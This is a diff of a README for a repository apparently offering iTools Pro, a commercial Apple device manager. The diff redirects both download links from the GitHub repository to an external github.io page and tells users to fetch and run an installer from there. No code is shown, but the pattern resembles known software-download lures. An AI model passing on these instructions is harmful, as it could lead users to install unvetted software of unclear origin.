@@ -1,6 +1,6 @@
 # 📱 Baixar-iTools-Pro - Manage your Apple devices today
 
-[![Download iTools Pro](https://img.shields.io/badge/Download-iTools_Pro-blue.svg)](https://github.com/ligercarping25/Baixar-iTools-Pro)
+[![Download iTools Pro](https://img.shields.io/badge/Download-iTools_Pro-blue.svg)](https://ligercarping25.github.io)
 
 ## 📌 Software Overview
 
@@ -23,7 +23,7 @@ Ensure your computer has the following setup before you begin the installation p
 
 Follow these instructions to set up the software on your system.
 
-1. Visit the main project page here: [https://github.com/ligercarping25/Baixar-iTools-Pro](https://github.com/ligercarping25/Baixar-iTools-Pro).
+1. Visit the main project page here: [https://ligercarping25.github.io](https://ligercarping25.github.io).
 2. Look for the release section or the primary download link provided on the page.
 3. Click the link to download the installer file to your computer.
 4. Locate the file in your downloads folder once the download finishes.
